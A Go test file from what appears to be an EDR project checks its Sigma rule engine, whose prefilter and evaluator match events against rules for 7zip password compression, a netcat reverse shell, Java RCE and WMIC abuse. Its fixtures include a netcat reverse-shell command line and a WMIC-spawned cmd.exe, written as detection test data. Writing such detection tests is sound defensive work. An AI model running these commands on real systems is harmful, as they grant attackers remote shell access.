package engine

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/PhucNguyen204/EDR_V2/pkg/sigma"
)

func mustLoadRule(t *testing.T, path string) sigma.RuleIR {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	r, err := sigma.LoadRuleYAML(b)
	if err != nil {
		t.Fatalf("load %s: %v", path, err)
	}
	return r
}

func TestPrefilterAndEvaluate_7zip_Pass(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")
	rNetcat := mustLoadRule(t, "../../testdata/rules/proc_creation_lnx_netcat_reverse_shell.yml")

	eng := Compile([]sigma.RuleIR{r7zip, rNetcat}, sigma.NewFieldMapping(map[string]string{
		"Description":        "Description",
		"Image":              "Image",
		"OriginalFileName":   "OriginalFileName",
		"CommandLine":        "CommandLine",
		"ProcessImage":       "Image",
		"ProcessCommandLine": "CommandLine",
	}))

	// Event có 7z + " a " + " -p" + Description => phải match 7zip, KHÔNG match netcat
	ev := map[string]any{
		"Image":            `C:\Program Files\7-Zip\7z.exe`,
		"CommandLine":      `7z.exe a out.7z C:\data\* -pS3cret`,
		"Description":      `7-Zip Console`,
		"OriginalFileName": `7z.exe`,
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}

	want7zip := false
	wantNetcat := false
	for _, id := range ids {
		if id == r7zip.ID {
			want7zip = true
		}
		if id == rNetcat.ID {
			wantNetcat = true
		}
	}

	if !want7zip || wantNetcat {
		t.Fatalf("expected ONLY 7zip match; got %v", ids)
	}
}

func TestPrefilterAndEvaluate_Netcat_Pass(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")
	rNetcat := mustLoadRule(t, "../../testdata/rules/proc_creation_lnx_netcat_reverse_shell.yml")

	eng := Compile([]sigma.RuleIR{r7zip, rNetcat}, sigma.NewFieldMapping(map[string]string{
		"Image":       "Image",
		"CommandLine": "CommandLine",
	}))

	// Event có netcat với reverse shell => phải match netcat, KHÔNG match 7zip
	ev := map[string]any{
		"Image":       `/usr/bin/nc`,
		"CommandLine": `nc -e /bin/bash 192.168.1.100 4444`,
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}

	want7zip := false
	wantNetcat := false
	for _, id := range ids {
		if id == r7zip.ID {
			want7zip = true
		}
		if id == rNetcat.ID {
			wantNetcat = true
		}
	}

	if !wantNetcat || want7zip {
		t.Fatalf("expected ONLY netcat match; got %v", ids)
	}
}

func TestPrefilter_FiltersOut_Unrelated(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")
	rNetcat := mustLoadRule(t, "../../testdata/rules/proc_creation_lnx_netcat_reverse_shell.yml")
	rJava := mustLoadRule(t, "../../testdata/rules/java_rce_exploitation_attempt.yml")

	eng := Compile([]sigma.RuleIR{r7zip, rNetcat, rJava}, sigma.NewFieldMapping(nil))

	// Event random: không chứa literal nào của các rules => AC cho 0 candidate
	ev := map[string]any{
		"Message": "completely unrelated text about weather",
		"Pid":     1234,
		"User":    "john",
	}

	cands := eng.candidates(ev)
	if len(cands) != len(eng.rulesNoLits) {
		// Không có rule "no literal" trong sample => mong đợi 0
		if len(cands) != 0 {
			t.Fatalf("expected 0 candidates, got %d", len(cands))
		}
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}
	if len(ids) != 0 {
		t.Fatalf("should match no rules, got %v", ids)
	}
}

func TestPrefilter_RuleWithoutLiterals_StillEvaluated(t *testing.T) {
	// Tạo rule không có literal: chỉ numeric compare (size > 10)
	r := sigma.RuleIR{
		ID: "numeric-only",
		Selections: map[string]sigma.Selection{
			"s": {
				Groups: []sigma.SelectionGroup{{
					Predicates: []sigma.SelectionPredicate{
						{Field: "size", Op: sigma.OpGt, Value: 10},
					},
				}},
			},
		},
		Condition: "s",
		Literals:  map[string]struct{}{}, // không có literal
	}

	eng := Compile([]sigma.RuleIR{r}, sigma.NewFieldMapping(nil))
	ev := map[string]any{"size": 11}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}
	if len(ids) != 1 || ids[0] != "numeric-only" {
		t.Fatalf("expected numeric-only match, got %v", ids)
	}
}

func TestPrefilter_MultipleRulesWithLiterals(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")
	rNetcat := mustLoadRule(t, "../../testdata/rules/proc_creation_lnx_netcat_reverse_shell.yml")
	rJava := mustLoadRule(t, "../../testdata/rules/java_rce_exploitation_attempt.yml")
	rWMIC := mustLoadRule(t, "../../testdata/rules/proc_creation_win_wmic_susp_execution_via_office_process.yml")

	eng := Compile([]sigma.RuleIR{r7zip, rNetcat, rJava, rWMIC}, sigma.NewFieldMapping(map[string]string{
		"Image":       "Image",
		"CommandLine": "CommandLine",
	}))

	// Event chứa nhiều literals từ các rules khác nhau
	ev := map[string]any{
		"Image":       `C:\Windows\System32\wmic.exe`,
		"CommandLine": `wmic process create call cmd.exe /c "7z.exe a test.7z -psecret"`,
	}

	cands := eng.candidates(ev)
	t.Logf("Candidates found: %d", len(cands))

	// Kiểm tra rằng prefilter tìm thấy candidates
	if len(cands) == 0 {
		t.Fatal("Expected some candidates from prefilter")
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}

	t.Logf("Matched rules: %v", ids)
	// Có thể match WMIC rule vì có wmic.exe và process create call
}

func TestPrefilter_CaseInsensitive(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")

	eng := Compile([]sigma.RuleIR{r7zip}, sigma.NewFieldMapping(map[string]string{
		"Image":       "Image",
		"CommandLine": "CommandLine",
	}))

	// Event với uppercase literals
	ev := map[string]any{
		"Image":            `C:\PROGRAM FILES\7-ZIP\7Z.EXE`,
		"CommandLine":      `7Z.EXE A OUT.7Z C:\DATA\* -PS3CRET`,
		"Description":      `7-ZIP CONSOLE`,
		"OriginalFileName": `7Z.EXE`,
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}

	// Phải match vì prefilter case-insensitive
	if len(ids) == 0 {
		t.Fatal("Expected 7zip rule to match with uppercase literals")
	}
}

func TestPrefilter_AllTestDataRules(t *testing.T) {
	// Load tất cả rules từ testdata
	testDataDir := "../../testdata/rules"
	files, err := filepath.Glob(filepath.Join(testDataDir, "*.yml"))
	if err != nil {
		t.Fatalf("Failed to read testdata directory: %v", err)
	}

	if len(files) == 0 {
		t.Skip("No test rules found in testdata/rules")
	}

	var rules []sigma.RuleIR
	for _, file := range files {
		rule := mustLoadRule(t, file)
		rules = append(rules, rule)
	}

	eng := Compile(rules, sigma.NewFieldMapping(map[string]string{
		"Image":       "Image",
		"CommandLine": "CommandLine",
		"ParentImage": "ParentImage",
	}))

	// Test với event có nhiều literals
	ev := map[string]any{
		"Image":       `C:\Windows\System32\wmic.exe`,
		"CommandLine": `wmic process create call cmd.exe /c "7z.exe a test.7z -psecret"`,
		"ParentImage": `C:\Program Files\Microsoft Office\WINWORD.EXE`,
	}

	cands := eng.candidates(ev)
	t.Logf("Total rules: %d, Candidates: %d", len(rules), len(cands))

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}

	t.Logf("Matched %d rules: %v", len(ids), ids)
}

func TestPrefilter_EmptyEvent(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")
	rNetcat := mustLoadRule(t, "../../testdata/rules/proc_creation_lnx_netcat_reverse_shell.yml")

	eng := Compile([]sigma.RuleIR{r7zip, rNetcat}, sigma.NewFieldMapping(nil))

	// Event rỗng
	ev := map[string]any{}

	cands := eng.candidates(ev)
	if len(cands) != len(eng.rulesNoLits) {
		if len(cands) != 0 {
			t.Fatalf("expected 0 candidates for empty event, got %d", len(cands))
		}
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}
	if len(ids) != 0 {
		t.Fatalf("expected no matches for empty event, got %v", ids)
	}
}

func TestPrefilter_NumericEvent(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")

	eng := Compile([]sigma.RuleIR{r7zip}, sigma.NewFieldMapping(nil))

	// Event chỉ có numeric values
	ev := map[string]any{
		"Pid":    1234,
		"Size":   1024,
		"Count":  5,
		"Active": true,
	}

	cands := eng.candidates(ev)
	if len(cands) != len(eng.rulesNoLits) {
		if len(cands) != 0 {
			t.Fatalf("expected 0 candidates for numeric-only event, got %d", len(cands))
		}
	}

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}
	if len(ids) != 0 {
		t.Fatalf("expected no matches for numeric-only event, got %v", ids)
	}
}

func TestPrefilter_MixedEvent(t *testing.T) {
	r7zip := mustLoadRule(t, "../../testdata/rules/proc_creation_win_7zip_password_compression.yml")
	rJava := mustLoadRule(t, "../../testdata/rules/java_rce_exploitation_attempt.yml")

	eng := Compile([]sigma.RuleIR{r7zip, rJava}, sigma.NewFieldMapping(map[string]string{
		"Image":       "Image",
		"CommandLine": "CommandLine",
	}))

	// Event có cả string và numeric values
	ev := map[string]any{
		"Image":            `C:\Program Files\7-Zip\7z.exe`,
		"CommandLine":      `7z.exe a out.7z C:\data\* -pS3cret`,
		"Description":      `7-Zip Console`,
		"OriginalFileName": `7z.exe`,
		"Pid":              1234,
		"Size":             1024,
		"Count":            5,
		"Active":           true,
		"Nested": map[string]any{
			"Message": "Cannot run program",
			"Code":    500,
		},
	}

	cands := eng.candidates(ev)
	t.Logf("Candidates for mixed event: %d", len(cands))

	ids, err := eng.Evaluate(ev)
	if err != nil {
		t.Fatal(err)
	}

	t.Logf("Matched rules: %v", ids)
	// Có thể match cả 7zip và Java rules vì có literals của cả hai
}
